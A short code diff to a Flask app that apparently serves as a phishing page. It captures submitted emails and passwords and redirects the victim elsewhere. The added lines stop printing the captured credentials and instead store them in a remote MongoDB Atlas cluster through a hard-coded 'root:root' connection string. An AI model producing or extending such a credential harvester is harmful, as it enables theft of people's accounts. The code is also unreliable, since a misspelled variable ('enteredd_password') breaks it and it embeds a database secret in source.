@@ -2,6 +2,8 @@
 import requests
 from flask import Flask, request, redirect, url_for
 from bs4 import BeautifulSoup
+import pymongo
+
 
 app = Flask(__name__)
 
@@ -28,9 +30,15 @@ def data():
     if request.method == 'POST':
         entered_email = request.form['email']
         entered_password = request.form['pass']
-        print("Entered Email:", entered_email)
-        print("Entered Password:", entered_password)
 
+        myclient = pymongo.MongoClient("mongodb+srv://root:root@cluster0.fsapxac.mongodb.net/?retryWrites=true&w=majority")
+        db=myclient['test']
+        testkeandartable=db["my_record"]
+        
+        data={"Entered Username":entered_email,
+              "Entered Password":enteredd_password}
+        testkeandartable.insert_one(data)
+        
         # Redirect the user to a different website after form submission
         return redirect(url_for('redirect_to_website'))
 
